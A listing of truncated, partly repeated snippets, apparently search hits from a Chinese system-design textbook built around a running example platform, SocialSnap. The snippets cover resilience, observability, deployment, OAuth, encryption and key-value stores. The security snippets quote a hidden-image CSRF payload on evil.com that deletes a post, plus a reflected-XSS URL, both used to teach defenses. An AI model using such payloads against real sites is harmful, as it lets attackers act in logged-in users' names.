  c16_b08.md: ...### 16.7 SocialSnap v6——挺过第一次故障  应用本章教训，SocialSnap 的基础架构为下一次事件重新设计。  **所有外部依赖调用...
  c16_b08.md: ...### 16.7 SocialSnap v6——挺过第一次故障  应用本章教训，SocialSnap 的基础架构为下一次事件重新设计。  **所有外部依赖调用都加了熔断器：** Redis（会话存储、缓存）、Postgr...
  c16_b08.md: ...-call 工程师被告警唤醒，查看事件，然后回去睡觉。到早上，主库磁盘已更换，旧主库作为副本恢复，系统回到完整冗余。  SocialSnap 挺过了第一次生产故障。...
  c16_b09.md: ...解发生了什么。系统发出的日志和指标就是证据。正确读取它们是把快速修复事故的工程师与手忙脚乱的工程师区分开的侦探技能。  SocialSnap Redis outage 中，关键线索一直存在于监控数据中：  **线索 1——Redis 错误率攀升。** Redi...
  c16_b13.md: ...**Q4.** 以 SocialSnap 为例解释优雅降级。举出一个应该先降级的功能和一个应受保护的功能。  **答案：** 优雅降级（graceful deg...
  c16_b13.md: ...着在部分组件失败时以受控、按优先级的方式减少功能，而不是完全失败。非必要功能先降级；必要功能用所有可用资源保护。  在 SocialSnap 中，“热门话题”侧边栏是第 3 层功能——非必要。如果计算热门话题的服务失败，应用应完全隐藏该侧边栏，其余页面正常服务...
  c16_b14.md: ...#### 应用问题  **Q1.** SocialSnap 的应用服务器为典型页面加载调用三个服务：User Service（获取登录用户资料）、Feed Service（获取用...
  c16_b14.md: ...失败率的绝对提升 modest，但用户体验提升显著：原本看到总错误的用户现在看到功能略减的页面。  **Q2.** 在 SocialSnap 周二的 outage 期间，工程师提出两个修复方案：(a) 把线程池大小从 200 增加到 2000，以处理更多并发慢...
  c16_b15.md: ...长期占用。熔断器在达到失败阈值后打开，消除后续请求的 500 毫秒等待。两者结合，完全防止级联。  **Q3.** 为 SocialSnap 应用服务器设计一个健康检查端点（`/health`）。它应该检查什么、返回什么，以及负载均衡器如何使用这些信息？  提...
  c16_b18.md: ...0，网络分区断开 US 和 EU 数据中心之间的链路。 2. 用户 A 在纽约更新个人简介为 “Engineer at SocialSnap”。US 数据中心接受该写（它无法联系 EU 协调，但配置为独立接受写）。 3. 用户 A 同时（通过漫游 EU 设备）...
  c16_b18.md: ...。EU 数据中心接受该写。 4. 下午 3:30，网络分区恢复。US 数据中心上 bio = "Engineer at SocialSnap"；EU 数据中心上 bio = "Software Engineer"。同一条记录有两个冲突值。  这就是脑裂。没有冲...
  c16_b19.md: ...，防止级联故障。舱壁隔离资源池，使一个失败功能不能耗尽另一个功能所需资源。优雅降级确保失败产生部分功能而非完全黑屏。  SocialSnap v6 挺过了第一次生产故障，因为这些模式都已就位：熔断器打开以防止级联，舱壁保护关键路径，自动故障转移在 30 秒内把...
  c16_b19.md: ...17 章将构建可观测性栈：日志、指标、分布式追踪，以及让这些数据可行动的仪表盘和告警系统。如果没有合适的可观测性工具，SocialSnap 在第 16 章经历的事故可能要 30 分钟才能诊断；有了它们，只需 3 分钟。这就是可观测性的价值。...
  c17_b01.md: ...回想第 16 章的周二下午。SocialSnap 的 Redis 集群在下午 2:47 开始降级。到 2:49，整个应用返回 503 错误。我们在第 16 章安装的熔断...
  c17_b01.md: ...就能被查询以理解其内部状态的系统。  这个区别在实践中很重要。监控告诉你有些东西出错了。可观测性告诉你为什么。  考虑 SocialSnap outage 后的两个场景。第一种，监控系统告诉你：“Redis 错误率超过 30%。”这是监控——预定义阈值被触发。...
  c17_b02.md: ...。它是一个被选中作为用户体验有意义表示的具体指标。  plain 语言：SLI 回答“我如何衡量这个服务运行得好不好？”SocialSnap 例子：  * 请求成功率：返回非 5xx 响应的 HTTP 请求比例 * 99 百分位延迟：99% 请求完成得比它快的...
  c17_b03.md: ...法律承诺的东西，违反会有财务或法律后果。它总是设置得比内部 SLO 宽松，这样内部目标略有下滑时合同才被破坏。  如果 SocialSnap 在 SLA 中向企业客户承诺 API 99.9% 可用性，内部 SLO 可能目标 99.95%——留出 0.05% 缓...
  c17_b05.md: ...#### 侦探与日志  回想第 3 章的福尔摩斯估算方法——从部分证据推理到确信结论。同一纪律适用于事故调查。  SocialSnap 监控面板周二下午变红时，第一个问题是：“什么变了？”有经验的事故响应者不会随机搜索日志。他们形成假设并用日志证实或证伪...
  c17_b06.md: ...志回答“发生了什么细节？”。但还有一个问题两者都不能完整回答：“这次特定请求的端到端路径是什么，它把时间花在哪里？”  SocialSnap 早期单体架构（第 1 章）中，回答这个问题很容易：一个进程，一个日志文件。但到了第 13 章的微服务架构，单次用户请求...
  c17_b06.md: ...示哪些服务按什么顺序处理请求、每一步花多久—— stitched together 跨越触碰请求的每个服务。  以下是 SocialSnap feed 请求追踪的文本形式示例：       Trace ID: abc123       [0ms - 245ms...
  c17_b09.md: ...### 17.5 SocialSnap v6 复盘  让我们回到第 16 章的周二 outage，用可观测性视角审视。具备合适可观测性基础设施的 Social...
  c17_b09.md: ...alSnap v6 复盘  让我们回到第 16 章的周二 outage，用可观测性视角审视。具备合适可观测性基础设施的 SocialSnap v6 会经历同样的 Redis 降级——但响应将截然不同。  下午 2:47，Redis 集群开始降级。30 秒内：...
  c17_b11.md: ...#### 应用问题  **Q1.** SocialSnap 每秒服务 50,000 请求。你正在为 `/feed` 端点设计 SLO。团队在 99% 可用性（允许 500 次失败...
  c17_b11.md: ...次允许失败。这给团队有意义的部署和实验空间。如果还写 p99 延迟 SLO，就拥有二维错误预算。  **Q2.** 为 SocialSnap 的通知服务（第 8 章引入）设计可观测性策略。该服务从队列消费并发送邮件和推送通知。你会埋哪些指标、emit 哪些日志...
  c17_b13.md: ...用户承诺是间接但真实的。SLO 把无论是否写下来都存在的用户期望转化为工程目标，可以测量、跟踪并用于投资决策。用户加载 SocialSnap feed 时期望它在 1 秒内加载——他们没有签 SLA，但如果应用一直慢他们就会离开。SLO 把模糊期望转化为可测量...
  c17_b14.md: ...律在事故调查中找到了自然归宿。日志是线索。形成假设，测试，抛弃或证实。好调查者不会随机搜索——他们从证据推理到原因。  SocialSnap v6 的周二 outage 通过可观测性视角复盘，展示了量化的差异：4 分钟优雅降级对 20 多分钟完全失败。不是不同...
  c18_b01.md: ...后部署到生产。如果东西坏了，你修复再部署。当系统小、用户少、失败只影响少数人、生产事故成本低时，这种工作流完全合理。  SocialSnap 有 300 万（3 million）用户。10 分钟 outage 影响 50 万（500,000）并发用户。一个让...
  c18_b01.md: ...（500,000）并发用户。一个让 5% 用户 feed 损坏的糟糕部署会产生数千张工单、可衡量的流失和受损声誉。然而 SocialSnap 需要持续发布功能——这是它的竞争力。工程团队需要回答一个听起来简单但真正困难的问题：如何改变一个运行中的系统而不破坏它...
  c18_b02.md: ...2 集成与负载测试——测试交互   #### 集成测试  服务集成测试让单个服务针对真实（或真实感）的依赖实例运行。对 SocialSnap 的 Feed Service，集成测试可能：  1. 启动一个 PostgreSQL 实例（测试环境用 Docker）...
  c18_b07.md: ...#### SocialSnap 的第一次金丝雀部署  SocialSnap 工程团队构建了一个新的 feed 排序算法。旧算法按反向时间顺序展示帖子。...
  c18_b07.md: ...#### SocialSnap 的第一次金丝雀部署  SocialSnap 工程团队构建了一个新的 feed 排序算法。旧算法按反向时间顺序展示帖子。新算法用参与预测模型重新排序 feed，把模...
  c18_b12.md: ...#### 应用问题  **Q1.** SocialSnap 想部署新功能“Reactions”（用户可以用 emoji 对帖子反应，而不仅是点赞）。这需要数据库迁移（添加 `re...
  c18_b12.md: ...默认关闭。 * 运行数天，确认新代码路径没有意外错误。  **阶段 3——内部测试（第 2 周）：**  * 仅对内部 SocialSnap 员工用户 ID 启用功能开关。 * 手动测试所有 reaction 流程。 * 监控新端点错误率。  **阶段 4——...
  c18_b12.md: ...误率回到基线。  功能开关是关键安全机制：它允许无需部署即即时回滚，并把代码部署与用户可见发布分离。  **Q2.** SocialSnap staging 环境的一次混沌实验揭示：当 Auth Service 被 kill 并重启时，Feed Service...
  c18_b15.md: ...用户。功能开关把部署与发布解耦。数据库迁移需要 expand-contract 模式，以在部署窗口期间保持向后兼容。  SocialSnap 的第一次金丝雀部署——新 feed 排序算法——表明部署安全不仅是防止失败。它是在承诺变更前从生产流量中收集经验证据。...
  c19_b01.md: ...题听起来相关，但概念和架构上分离。混淆它们是最常见的安全漏洞来源之一。  **认证** 建立身份。当你用邮箱和密码登录 SocialSnap 时，系统认证你：它验证你声称的身份。成功认证后，系统信任带有你凭证的请求来自你。  **授权** 决定权限。Socia...
  c19_b01.md: ...lSnap 时，系统认证你：它验证你声称的身份。成功认证后，系统信任带有你凭证的请求来自你。  **授权** 决定权限。SocialSnap 知道你是谁后，必须决定允许你做什么。你可以编辑自己的帖子，但不能编辑别人的。你可以查看公开资料，但不能查看未与你建立联...
  c19_b01.md: ...` 端点，但不能访问 `/admin/users` 端点。   #### 区分具体例子  这个场景说明区分为何重要：  SocialSnap 推出第三方开发者 API。一个开发者构建读取用户公开帖子的应用。用户向 SocialSnap 认证——这建立了身份。但...
  c19_b01.md: ...场景说明区分为何重要：  SocialSnap 推出第三方开发者 API。一个开发者构建读取用户公开帖子的应用。用户向 SocialSnap 认证——这建立了身份。但第三方应用不应访问用户的私信、账户设置或代表用户发帖。  认证回答“这是正确用户吗？”——是的...
  c19_b02.md: ...别  把认证和授权视为恰好一起使用的独立系统。   ### 19.2 OAuth 2.0 与基于 token 的认证  SocialSnap 的第三方开发者 API 需要一种机制，让用户向应用授予有限访问而不共享密码。与第三方应用共享密码是灾难性安全实践：如果...
  c19_b03.md: ...#### OAuth 2.0 流程（概念）  当用户把第三方应用（“PostScheduler”）连接到 SocialSnap 时，发生如下过程：  1. PostScheduler 把用户重定向到 SocialSnap 的授权页：“PostSc...
  c19_b03.md: ...heduler”）连接到 SocialSnap 时，发生如下过程：  1. PostScheduler 把用户重定向到 SocialSnap 的授权页：“PostScheduler 希望访问：读取你的帖子、代表你发帖。允许或拒绝？” 2. 用户点击“允许”。S...
  c19_b03.md: ...p 的授权页：“PostScheduler 希望访问：读取你的帖子、代表你发帖。允许或拒绝？” 2. 用户点击“允许”。SocialSnap 生成一个 **authorization code**，并把用户重定向回 PostScheduler。 3. Post...
  c19_b03.md: ...回 PostScheduler。 3. PostScheduler 把这个 authorization code 发到 SocialSnap 的 token 端点（server-to-server，不经过用户浏览器）。SocialSnap 返回一个 **acc...
  c19_b03.md: ...on code 发到 SocialSnap 的 token 端点（server-to-server，不经过用户浏览器）。SocialSnap 返回一个 **access token** 和一个 **refresh token**。 4. PostSchedul...
  c19_b03.md: ...PI 请求中使用 access token：`Authorization: Bearer eyJhbGciOi...`。SocialSnap 验证 token 并按用户权限处理请求。 5. Access token 过期（通常 1 小时后）。PostSched...
  c19_b03.md: ...收到带 JWT 的请求时，用对应公钥验证签名。如果签名有效，payload 中的 claims 可信——token 由 SocialSnap 认证服务器创建且未被篡改。Feed Service 可以从 payload 中提取 `user_id` 和 `scop...
  c19_b04.md: ...盘上——两者都可能被对手截获。   #### HTTPS 与 TLS——传输中加密  当用户浏览器向 `https://socialsnap.com` 发送请求时，数据以数据包形式在互联网上传输。没有加密，用户与 SocialSnap 服务器之间的任何网络节点...
  c19_b04.md: ...览器向 `https://socialsnap.com` 发送请求时，数据以数据包形式在互联网上传输。没有加密，用户与 SocialSnap 服务器之间的任何网络节点——他们的 ISP、咖啡店的 Wi-Fi 路由器、某处被入侵的路由器——都能读取这些数据包内容...
  c19_b04.md: ...浏览器验证证书链——该证书由 DigiCert 签名，而 DigiCert 在浏览器证书库中可信。这证明服务器确实是 `socialsnap.com`，而不是冒充者。 2. 协商共享密钥：使用非对称加密（公钥/私钥），浏览器和服务器商定一个只有它们知道的对称加...
  c19_b05.md: ...表。即使攻击者获得数据库进程访问，也只能看到相关列中的加密字节。 3. **应用级加密：** 写入数据库前加密敏感字段。SocialSnap 可能在应用层加密用户手机号再存储，即使无限制数据库查询也返回需要应用密钥解密的密文。  **哪些字段需要静态加密？**...
  c19_b06.md: ...方法。输入清理——试图检测并移除危险字符——不够，因为攻击模式比清理规则演化更快。   #### 跨站脚本（XSS）  SocialSnap 允许用户写帖子。一个幼稚实现直接存储帖子内容并作为 HTML 渲染：       <div class="post">...
  c19_b06.md: ...行）。它极具破坏力，因为一次发帖就能破坏数千用户。  **反射型 XSS** 类似，但使用 URL 参数：恶意链接如 `socialsnap.com/search?q=<script>...</script>` 使脚本反射回搜索结果页并执行。  修复方法：在渲...
  c19_b07.md: ...#### 跨站请求伪造（CSRF）  SocialSnap 用户登录后，浏览器存储会话 cookie。每个 SocialSnap 请求都自动包含该 cookie——浏览器对所有发...
  c19_b07.md: ...#### 跨站请求伪造（CSRF）  SocialSnap 用户登录后，浏览器存储会话 cookie。每个 SocialSnap 请求都自动包含该 cookie——浏览器对所有发往该域的请求都会发送它，无论请求来源何处。  CSRF 攻击利用这一点...
  c19_b07.md: ...CSRF 攻击利用这一点。攻击者在 `evil.com` 创建页面：       <img src="https://socialsnap.com/posts/delete?id=12345" style="display:none">   当登录的 Soc...
  c19_b07.md: ...nap.com/posts/delete?id=12345" style="display:none">   当登录的 SocialSnap 用户访问 `evil.com` 时，浏览器加载这个“图片”——实际上是向 SocialSnap 发 GET 请求。So...
  c19_b07.md: ...ne">   当登录的 SocialSnap 用户访问 `evil.com` 时，浏览器加载这个“图片”——实际上是向 SocialSnap 发 GET 请求。SocialSnap 看到带有有效会话 cookie 的请求（浏览器自动发送）并删除帖子 12345...
  c19_b07.md: ...ap 用户访问 `evil.com` 时，浏览器加载这个“图片”——实际上是向 SocialSnap 发 GET 请求。SocialSnap 看到带有有效会话 cookie 的请求（浏览器自动发送）并删除帖子 12345。  修复方法：**CSRF token...
  c19_b07.md: ...带有有效会话 cookie 的请求（浏览器自动发送）并删除帖子 12345。  修复方法：**CSRF token**。SocialSnap 渲染每个表单时生成一个随机的、用户特定的 token，并作为隐藏字段包含。浏览器提交表单时附带该 token。Soci...
  c19_b07.md: ...Snap 渲染每个表单时生成一个随机的、用户特定的 token，并作为隐藏字段包含。浏览器提交表单时附带该 token。SocialSnap 处理请求前验证 token。由于 `evil.com` 无法读取 SocialSnap 表单中的 CSRF token...
  c19_b07.md: ...器提交表单时附带该 token。SocialSnap 处理请求前验证 token。由于 `evil.com` 无法读取 SocialSnap 表单中的 CSRF token（被同源策略阻止），它无法伪造有效请求。  **SameSite cookie 属性**...
  c19_b12.md: ...#### 概念检测  **Q1.** 用户加载 SocialSnap 帖子，浏览器将部分帖子内容渲染为 HTML，导致脚本执行。该脚本把用户会话 cookie 发到外部服务器。这是什么类型...
  c19_b12.md: ...，因为如果解密密钥也泄露，所有密码都暴露；而且密钥必须存放在某处，成为另一个需要保护的密钥。  **Q3.** 用一个 SocialSnap 架构的具体例子解释最小权限原则。  **答案：** 最小权限原则：每个实体只访问它需要的资源，不多不少。具体例子：So...
  c19_b12.md: ...ap 架构的具体例子解释最小权限原则。  **答案：** 最小权限原则：每个实体只访问它需要的资源，不多不少。具体例子：SocialSnap 的 Feed Service 需要读取帖子和用户资料来生成 feed。它不需要写帖子、删除用户或访问支付记录。Feed...
  c19_b14.md: ...#### 应用问题  **Q1.** 为 SocialSnap 的第三方开发者 API 设计认证与授权系统。开发者可以构建访问用户帖子和资料的应用。用户必须能控制哪些应用可以访问其账...
  c19_b14.md: ...存在哪里？概念上使用 OAuth 2.0（OAuth 2.0）流程。  **答案：**  **应用注册：** 开发者向 SocialSnap 注册应用（名称、描述、允许的 redirect URI）。SocialSnap 颁发 `client_id`（公开）和...
  c19_b14.md: ...：**  **应用注册：** 开发者向 SocialSnap 注册应用（名称、描述、允许的 redirect URI）。SocialSnap 颁发 `client_id`（公开）和 `client_secret`（私密，仅 server-side 用于 tok...
  c19_b14.md: ...OAuth 2.0 Authorization Code）：**  1. 用户点击第三方应用中的“Connect to SocialSnap”。 2. 应用把用户重定向到 `socialsnap.com/oauth/authorize?client_id=.....
  c19_b14.md: ...e）：**  1. 用户点击第三方应用中的“Connect to SocialSnap”。 2. 应用把用户重定向到 `socialsnap.com/oauth/authorize?client_id=...&scope=read:posts,read:pro...
  c19_b14.md: ...osts,read:profile&redirect_uri=...&state=random_string`。 3. SocialSnap 显示同意页：“App X 想读取你的帖子和资料。允许？” 4. 用户批准。SocialSnap 重定向到 `redir...
  c19_b14.md: ...string`。 3. SocialSnap 显示同意页：“App X 想读取你的帖子和资料。允许？” 4. 用户批准。SocialSnap 重定向到 `redirect_uri?code=AUTH_CODE&state=random_string`。 5....
  c19_b14.md: ...g`。 5. 应用服务器把 `client_id`、`client_secret` 和 `AUTH_CODE` 发到 `socialsnap.com/oauth/token`（server-to-server，永远不在用户浏览器中）。 6. SocialSna...
  c19_b14.md: ...ocialsnap.com/oauth/token`（server-to-server，永远不在用户浏览器中）。 6. SocialSnap 返回 `access_token`（JWT，1 小时过期）和 `refresh_token`（不透明，长期，存于数据库...
  c19_b14.md: ...** 应用在每个请求中包含 `Authorization: Bearer <access_token>` header。SocialSnap 验证 JWT 签名并检查 `scope` claim，确保请求操作在授予范围内。  **Token 刷新：** acc...
  c19_b14.md: ...*Token 刷新：** access token 过期时，应用把 refresh token 发到 token 端点。SocialSnap 在数据库（服务器（server）端状态）验证 refresh token，签发新 access token。如果 re...
  c19_b14.md: ...签发新 access token。如果 refresh token 被撤销，刷新失败。  **用户撤销：** 用户访问 SocialSnap 设置，看到“Connected Apps”，撤销特定应用访问。SocialSnap 从数据库删除 refresh to...
  c19_b14.md: ...。  **用户撤销：** 用户访问 SocialSnap 设置，看到“Connected Apps”，撤销特定应用访问。SocialSnap 从数据库删除 refresh token。应用无法获得新 access token。现有 access token 在...
  c19_b14.md: ...的应用即使持有有效 JWT 也不能调用 Direct Messages 端点——授权检查会拒绝它。  **Q2.** SocialSnap 存储用户手机号用于双因素认证。设计手机号的数据存储策略，兼顾安全和运营需求（支持人员偶尔需要验证用户手机号以进行账户恢...
  c20_b10.md: ...#### 应用问题  **Q1.** SocialSnap（第 5 章的平台）想增加短链功能。用户发帖时，SocialSnap 自动创建短版本。工程团队争论把它做成独立微服务还是...
  c20_b10.md: ...#### 应用问题  **Q1.** SocialSnap（第 5 章的平台）想增加短链功能。用户发帖时，SocialSnap 自动创建短版本。工程团队争论把它做成独立微服务还是集成到现有 Post Service。用本章设计证据论证两种方案，然...
  c20_b10.md: ...现更简单：为快速上线功能，构建独立服务及其数据库、部署流水线、监控和 on-call 轮换是重大开销。 * 规模还没到：SocialSnap 当前阶段每天不会收到 1 亿个链接创建——独立扩展的好处可能不值得其复杂度。  **决策：** 先集成到 Post S...
  c20_b11.md: ...径（Kafka）与读路径（历史查询走数据仓库、实时查询走 Redis）分离，各自为特定查询模式优化。  **Q3.** SocialSnap 营销团队想创建自定义短链（例如 `ssnap.io/summer-sale`），除自动生成的码外。用户可声明最长 20...
  c20_b13.md: ...缓存。 * **副本分布：** 读副本（第 12 章）把残余数据库负载分布到多个节点。  点击波是 URL 短链领域的 SocialSnap 病毒帖子——单独看正常，但产生极大的集中负载。处理病毒帖子的相同缓存原则也处理营销点击波。   ### 本章总结  U...
  c21_b01.md: ...用户尚未阅读。  这是有状态的世界（stateful，有状态的）——架构挑战与第 20 章设计的任何东西都完全不同。  SocialSnap 工程团队在 v7 面临这个挑战。SocialSnap 已增长到 5000 万用户，产品路线图要求增加 Direct M...
  c21_b01.md: ...有状态的）——架构挑战与第 20 章设计的任何东西都完全不同。  SocialSnap 工程团队在 v7 面临这个挑战。SocialSnap 已增长到 5000 万用户，产品路线图要求增加 Direct Message（DM）功能。决策：构建简单收件箱模型（像...
  c21_b01.md: ...建带送达回执、已读回执和在线状态的实时聊天系统。团队选择实时。本章设计该系统。   ### 侦探简报  **客户：** SocialSnap v7——为拥有 5000 万（50 million）注册用户、500 万（5 million）日活用户的社交平台增加...
  c21_b01.md: ...”（presence） * 消息历史保留，用户可搜索最长 1 年 * 群聊最多 100 名成员 * DM 系统不得降低 SocialSnap 核心 feed 体验（隔离要求）  **约束（证据）：**  * 500 万（5 million）日活用户；峰值并发用...
  c21_b09.md: ...找加最多 100 次服务器间消息投递。按群的消息速率，可管理。但如果是 1000 名成员？1 万（10000）名？如果 SocialSnap 创建 100 万成员的“社区广播”群呢？  100 万成员时，发一条消息需要：  * 1,000,000 次注册表查找...
  c21_b09.md: ...00 名），需要不同策略。  我们将在第 22 章深入讨论扇出，在那里它成为新闻 Feed 设计的中心话题。目前，注意 SocialSnap DM 功能把群限制在 100 名成员，使用投递时直接扇出——100 次注册表查找和 100 次消息推送最多是约 50m...
  c21_b10.md: ...### 21.7 SocialSnap v7——架构回顾  DM 功能把 SocialSnap 带到 v7。让我们退一步，追溯全书 SocialSnap 架构...
  c21_b10.md: ...### 21.7 SocialSnap v7——架构回顾  DM 功能把 SocialSnap 带到 v7。让我们退一步，追溯全书 SocialSnap 架构的完整演进，看每一章的决策如何累积成当前架构。  **v...
  c21_b10.md: ....7 SocialSnap v7——架构回顾  DM 功能把 SocialSnap 带到 v7。让我们退一步，追溯全书 SocialSnap 架构的完整演进，看每一章的决策如何累积成当前架构。  **v0（第 1 章）：** 笔记本上的单个 Python 函数...
  c21_b10.md: ...心 feed 系统隔离（独立连接服务器、独立数据库集群），以满足 DMs 不得降低核心体验的约束。  当前架构长什么样？SocialSnap v7 拥有：  * **API gateway + 负载均衡器（load balancer）** 处理所有入站流量 *...
  c21_b13.md: ...API 拉取最近消息当前状态，发现 `delivered_at` 已设置，于是更新 UI。最终一致。  **Q2.** SocialSnap 想支持最多 500 名成员的群聊（从最初 100 上调）。一条发到 500 人群的消息必须在 200ms 内投递给所有...
  c21_b14.md: ...著负载。第 22 章的扇出策略（写时扇出加专用投递服务）在该规模下变得必要。  **Q3.**（联系第 3 章估算方法）SocialSnap 的 DM 功能上线，50 万（500,000）日活用户。假设每名 DAU 平均每天发 8 条消息、每收到一条消息收到一...
  c21_b16.md: ...性模型，而非技术纯粹性。对消息，用户会注意到不一致（消息丢失是灾难性）。对在线状态，用户可容忍陈旧。  **Q2.** SocialSnap 的 DM 功能起初是与核心 feed 隔离的独立子系统。随着时间，产品团队提出需要集成的功能：“当有人发 DM 时在...
  c21_b17.md: ...00）时通过批量投递可管理，但在大 N 时成为架构挑战。这个扇出问题在群聊设计中初现端倪，是第 22 章的中心话题。  SocialSnap v7 代表完整的当前架构：核心产品用无状态的（stateless）HTTP 服务，实时消息用有状态的（stateful...
  c22_b01.md: ...创建帖子 P 时，如何以及何时让 P 出现在 U 的关注者的 feed 中？   ### 侦探简报  **客户：** SocialSnap 正在构建完整新闻 feed（超越前面章节简单 feed）。Feed 必须显示被关注用户的帖子，按相关性排序，持续更新。...
  c22_b04.md: ...000 条对大多数用例足够。   ### 22.4 Feed 排序——把按时间列表变成按相关性排序的 Feed  早期 SocialSnap（第 1–11 章）按反向时间顺序显示 feed。第 18 章金丝雀部署引入了排序算法——SocialSnap 对 5%...
  c22_b04.md: ...早期 SocialSnap（第 1–11 章）按反向时间顺序显示 feed。第 18 章金丝雀部署引入了排序算法——SocialSnap 对 5% 用户测试的新 feed 算法。现在我们设计该算法。...
  c22_b07.md: ...Fanout Service 是一个 Kafka 消费者，处理 `post_created` 事件——与第 8 章为 SocialSnap 通知队列引入的基于 Kafka 的异步解耦模式相同，现在应用于 feed 投递规模。它是扇出架构的心脏：  * **水...
  c22_b12.md: ...#### 应用问题  **Q1.** SocialSnap 增加“密友”功能：用户可以标记部分关注者为“仅密友可见”的密友。约 5% 帖子标记为仅密友可见；每用户平均有 50 位...
  c24_b06.md: ...尽连接句柄——摄取服务失败不是因为计算过载，而是因为连接句柄用完。  这里出现的基于队列的解耦，规模远大于第 8 章为 SocialSnap 邮件通知系统引入的队列。原则相同：用持久队列异步解耦，使两个系统独立可扩展并对彼此故障有韧性。  * * *   ##...
  c24_b09.md: ...作者宣布加入平台）和转码负载峰值是独立事件。队列吸收突发上传量，无需转码立即扩展——转码按自己节奏扩展。这与第 8 章 SocialSnap 邮件队列引入的解耦原则相同。...
  c25_b04.md: ...不能同时把请求转换到 ACCEPTED。   #### 匹配的一致性——为什么不能在这里用最终一致性  这是拼车系统与 SocialSnap feed（第 22 章）或搜索索引（第 23 章）明显不同的地方。匹配操作是一个 **分布式事务（distribute...
  c26_b01.md: ...你从第 7 章起就在使用键值存储。Redis 在 SocialSnap v2 中作为缓存出现，在第 11 章作为外部会话存储，在第 22 章作为 timeline 存储，在第 25 章作为位...
  c26_b01.md: ...一键值产生分歧时怎么办？  这是综合章。第二部分和第三部分的所有概念都会在构建这个工具本身的语境中重新出现。本章还揭示 SocialSnap 最底层的基础设施：支撑平台每个组件的键值存储——当工程团队规模大到需要自研时，他们构建的 Redis 兼容、分布式、自...
  c26_b01.md: ...键 * 系统跨越 N 台机器（节点） * 即使部分节点宕机，操作也必须成功 * 系统必须能添加和删除节点而无需停机 * SocialSnap 的键值存储具体：100 亿（10 billion）个键、每秒 1 亿（100 million）次读取、每秒 1000...
  c26_b01.md: ...若节点故障，其键必须仍可通过副本访问 * 若添加节点，负载必须自动重新分布——但不是所有键都移动 * 写可用性至关重要：SocialSnap 的 feed 系统不能等所有节点一致同意再写入 * 读性能至关重要：feed 读取每秒 1 亿次，不能容忍高读取延迟...
  c26_b01.md: ...个节点间分区数据、复制以实现容错，并在保持副本一致的同时达到数亿操作/秒？  关键洞察，我们将逐步展开：这个问题正是 SocialSnap 工程团队设计基础设施时面对的问题。分布式键值存储不是抽象练习——它是 SocialSnap 平台规模扩大后真正的底层基...
  c26_b01.md: ...们将逐步展开：这个问题正是 SocialSnap 工程团队设计基础设施时面对的问题。分布式键值存储不是抽象练习——它是 SocialSnap 平台规模扩大后真正的底层基础。  * * *   ### 26.1 一致性哈希——无混乱地分布键  决定如何复制数据前...
  c26_b03.md: ...R 个节点读，且 W + R 超过副本总数 N，那么每次读都会联系到至少一个参与最新写的节点。你保证看到最新值。  对 SocialSnap 键值存储：工程团队选 N=3、W=1、R=1。这意味着：写只需 1 个副本确认就完成（非常快）；读只联系 1 个副本（...
  c26_b03.md: ...（非常快）。但 W + R = 2，小于 N = 3，所以一致性是最终一致——不同副本在同一时刻可能有不同值。  这是 SocialSnap feed 和会话用例的正确选择：轻微陈旧可接受；速度至关重要。对金融数据这是错误选择——计费使用关系型数据库（第 25...
  c26_b06.md: ...### 26.6 SocialSnap 完整技术栈——透过键值存储看  本节兑现 Thread A：SocialSnap 在规模化后，通过分布式键值存储的镜头...
  c26_b06.md: ...### 26.6 SocialSnap 完整技术栈——透过键值存储看  本节兑现 Thread A：SocialSnap 在规模化后，通过分布式键值存储的镜头揭示其完整基础设施。  SocialSnap v7 架构（第 21 章建立）依赖多...
  c26_b06.md: ...存储看  本节兑现 Thread A：SocialSnap 在规模化后，通过分布式键值存储的镜头揭示其完整基础设施。  SocialSnap v7 架构（第 21 章建立）依赖多个键值存储，却从未检视其内部。现在我们看到全貌。  **SocialSnap 的键...
  c26_b06.md: ...。  SocialSnap v7 架构（第 21 章建立）依赖多个键值存储，却从未检视其内部。现在我们看到全貌。  **SocialSnap 的键值存储及其 quorum 配置：**  **会话存储**（SocialSnap v4，第 11 章）：存储用户会话...
  c26_b06.md: ...障期间的高写可用性——timeline 即使在部分故障时也必须可写。  **位置追踪**（拼车服务，第 25 章，用作 SocialSnap 实时功能模板）：N=3，W=1，R=1。高写入吞吐（1.25M/s）。不需要强一致性；< 5 秒陈旧的最终一致性（ev...
  c26_b06.md: ...L）以获得 ACID 保证。键值存储处理高吞吐、延迟敏感、可容忍陈旧的数据——不是永久记录的真相来源。  工程洞察：像 SocialSnap 这样的成熟系统对不同访问模式使用不同存储技术，正如键值存储对不同类型数据使用不同 N/W/R 配置。正确的一致性级别始...
  c26_b06.md: .../W/R 配置。正确的一致性级别始终是数据具体需求的函数——而非系统级设置。   #### Merkle Tree 与 SocialSnap 数据调和  SocialSnap 分布式键值存储用 Merkle tree 检测其三副本节点之间的分歧。任何节点故障恢...
  c26_b06.md: ...终是数据具体需求的函数——而非系统级设置。   #### Merkle Tree 与 SocialSnap 数据调和  SocialSnap 分布式键值存储用 Merkle tree 检测其三副本节点之间的分歧。任何节点故障恢复后，anti-entropy 过...
  c26_b07.md: ...pache Cassandra、Riak 和 DynamoDB（托管云服务）都是 Dynamo 设计的直系后裔。当你在 SocialSnap 缓存中使用 Redis 时，你使用的是一个更简单的内存变体。当 SocialSnap 最终超出 Redis 并需要持久...
  c26_b07.md: ...namo 设计的直系后裔。当你在 SocialSnap 缓存中使用 Redis 时，你使用的是一个更简单的内存变体。当 SocialSnap 最终超出 Redis 并需要持久化、具备 Dynamo 风格保证的分布式存储时，本章概念就是升级的动力。  * * *...
  c26_b08.md: ...2 ≤ 3。写只需 1 个节点确认——非常快。读只联系 1 个节点——非常快。但读联系的节点可能不是收到写的那个。用于 SocialSnap 的 timeline 缓存和位置追踪，速度 > 一致性。强一致（N=3，W=2，R=2）：W + R = 4 > 3。...
  c26_b10.md: ...#### 应用问题  **Q1.** SocialSnap 键值集群 N=3 副本，配置 W=1、R=1。网络分区期间，节点 A 和 B 可相互通信，但节点 C 被隔离。一个写到...
  c26_b10.md: ...handoff 传播速度。这就是最终一致性的本质：系统会收敛，但在收敛窗口期间读可能返回陈旧值。  **Q2.** 为 SocialSnap 200 节点键值集群设计 gossip 协议参数，使集群状态在 10 秒内全集群传播。每次 gossip 轮耗时 1...
  c26_b11.md: ...仅为基线的 2 倍。（K=2：2^k ≥ 200 → k ≥ log₂(200) ≈ 7.6 → 8 轮 → 8 秒。）SocialSnap 生产配置：K=2，gossip 间隔 1 秒，集群成员变更在 8 秒内全集群传播。  **Q3.** SocialSn...
